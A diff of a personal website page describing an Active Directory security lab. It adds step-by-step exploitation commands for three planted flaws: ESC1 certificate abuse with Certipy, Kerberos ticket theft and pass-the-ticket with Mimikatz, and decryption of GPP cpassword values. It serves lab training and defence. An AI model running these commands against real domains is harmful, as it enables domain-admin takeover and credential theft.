@@ -2,48 +2,79 @@
 layout: page
 title: Active Directory Security Lab
 subtitle: Multi-domain Windows Active Directory forest environment
+permalink: /labs/ad-labs/
 ---
 
-## Lab Architecture
+## 🌲 Windows AD Lab Architecture
 
-The Active Directory Security Lab is a local virtualized environment designed to model realistic enterprise networks, enabling safe simulation of active directory attacks, privilege escalation, and configuration auditing.
+The Active Directory Security Lab is an on-premise virtualized environment designed to model complex enterprise corporate networks. This setup allows safe, offline simulations of lateral movement, credential access, trust exploitation, and misconfiguration analysis.
 
 ```mermaid
 graph TD
-    DC1["DC-01.corp.local (Domain Controller)"]
-    DC2["DC-02.sub.corp.local (Child Domain DC)"]
-    WS1["WS-01.corp.local (Windows 10 Workstation)"]
-    SRV1["SRV-01.corp.local (SQL Server Database)"]
+    DC1["DC-01.corp.local<br>(Forest Root DC - Win2019)"]
+    DC2["DC-02.sub.corp.local<br>(Child DC - Win2016)"]
+    WS1["WS-01.corp.local<br>(User Workstation - Win10)"]
+    SRV1["SRV-01.corp.local<br>(SQL Database Server)"]
     
     DC1 -.->|Parent-Child Trust| DC2
     WS1 -->|Domain Joined| DC1
     SRV1 -->|Domain Joined| DC1
 ```
 
-### Lab Specifications
+### 📋 Technical Specifications
 
-*   **Hypervisor**: VMware ESXi / Proxmox VE
-*   **Virtual Machines**:
-    *   **DC-01 (Windows Server 2019)**: Primary Domain Controller for `corp.local` domain. Handles Active Directory Domain Services (AD DS) and Active Directory Certificate Services (AD CS).
-    *   **DC-02 (Windows Server 2016)**: Child Domain Controller for `sub.corp.local`.
-    *   **SRV-01 (Windows Server 2019)**: Dedicated SQL database server running MSSQL service.
-    *   **WS-01 (Windows 10 Pro)**: Corporate user workstation simulating day-to-day employee activity.
-*   **Provisioning Tool**: Automated installation via Vagrant and custom PowerShell DSC configurations.
+*   **Hypervisor Platforms**: Proxmox VE / VMware ESXi
+*   **Active Directory Domain Services**: 2 Domains (`corp.local` parent forest and `sub.corp.local` child branch)
+*   **Virtual Hosts**:
+    *   **DC-01**: Windows Server 2019 running Active Directory Domain Services (AD DS), DNS, and Active Directory Certificate Services (AD CS).
+    *   **DC-02**: Windows Server 2016 child domain controller running AD DS and DNS.
+    *   **SRV-01**: Windows Server 2019 running Microsoft SQL Server database engine.
+    *   **WS-01**: Windows 10 Enterprise corporate desktop client simulating active end-user activity.
+*   **Deployment Method**: Auto-provisioned using **Vagrant** running VirtualBox/libvirt providers, configured via custom **PowerShell Desired State Configuration (DSC)** scripts.
 
 ---
 
-## Simulated Vulnerabilities & Attack Paths
+## 💥 Configured Privilege Escalation Paths
 
-The environment is configured with common enterprise security flaws to test attack vectors:
+This lab environment features classic and modern Active Directory vulnerabilities to test offensive tooling and defensive monitoring configs:
 
-### 1. Active Directory Certificate Services (AD CS) ESC1 Abuse
-*   **Misconfiguration**: Certificate template configured with `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` allowing the enrollee to specify a Subject Alternative Name (SAN). The template is accessible to all domain users.
-*   **Attack Vector**: Using Certify or Certipy to request a certificate as a standard domain user while specifying the Domain Administrator as the SAN, obtaining a PFX certificate to authenticate as Domain Admin.
+### 1. AD CS Certificate Template Abuse (ESC1)
+*   **Root Cause**: The domain certificate authority (AD CS) has published a template configured with the flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`. This template is enrollable by the `Domain Users` group, allowing requestors to supply arbitrary Subject Alternative Names (SAN).
+*   **Attack Vector**: An attacker compromises a low-privileged domain user account, then uses a tool like `Certify` or `Certipy` to request a certificate while masquerading as a Domain Administrator in the SAN field.
+*   **Exploitation Commands**:
+    ```bash
+    # Requesting the certificate as low-priv user representing Administrator
+    certipy req -u lowpriv@corp.local -p Password123 -ca corp-DC-01-CA -template ESC1-Template -upn administrator@corp.local -out admin.pfx
+    
+    # Authenticate via Kerberos (PKINIT) to retrieve NTLM hash
+    certipy auth -pfx admin.pfx -dc-ip 10.10.10.50
+    ```
 
 ### 2. Kerberos Unconstrained Delegation
-*   **Misconfiguration**: `SRV-01` server is trusted for unconstrained delegation.
-*   **Attack Vector**: Compromise `SRV-01`, trigger a connection from a Domain Controller (e.g., via Printer Bug or PetitPotam), capture the DC's TGT ticket from memory (LSASS), and impersonate the DC.
+*   **Root Cause**: The SQL service account or computer object `SRV-01$` is configured with the `TRUSTED_FOR_DELEGATION` attribute, indicating it can delegate client credentials to any service.
+*   **Attack Vector**: Once administrative rights are obtained on `SRV-01`, the attacker monitors memory for TGTs of domain admin users connecting to the database. Alternatively, the attacker triggers a connection from a high-priv privilege host (such as `DC-01$`) utilizing the Printer Bug or PetitPotam, and steals the ticket.
+*   **Exploitation Commands**:
+    ```powershell
+    # Monitor memory on compromised SRV-01 using Mimikatz
+    sekurlsa::tickets /export
+    
+    # Inject the stolen Domain Admin TGT into current session
+    kerberos::ptt DC-01$@CORP.LOCAL.kirbi
+    ```
 
 ### 3. Group Policy Preference (GPP) Credential Leaking
-*   **Misconfiguration**: Legacy GPP XML files left in the SYSVOL share containing encrypted local administrator passwords.
-*   **Attack Vector**: Locate `Groups.xml` in SYSVOL, extract the `cpassword` attribute, decrypt it using the known AES key, and use the credentials for initial access.
+*   **Root Cause**: Legacy Group Policy Preferences objects located in the `SYSVOL` domain share hold XML configuration files (e.g. `Groups.xml`) containing encrypted local administrator credentials.
+*   **Attack Vector**: Any authenticated domain user reads the shared GPP files, extracts the `cpassword` string, and decrypts it using the public Microsoft AES decryption key.
+*   **Exploitation Commands**:
+    ```bash
+    # Searching SYSVOL files for password strings
+    find /sysvol -name "*.xml" | xargs grep "cpassword"
+    
+    # Decrypting via gpp-decrypt utility
+    gpp-decrypt "Azj9ha32...[encrypted_cpassword_string]..."
+    ```
+
+---
+
+### 🔗 Back to Hub
+- [Return to Security Labs Hub]({{ '/labs/' | relative_url }})
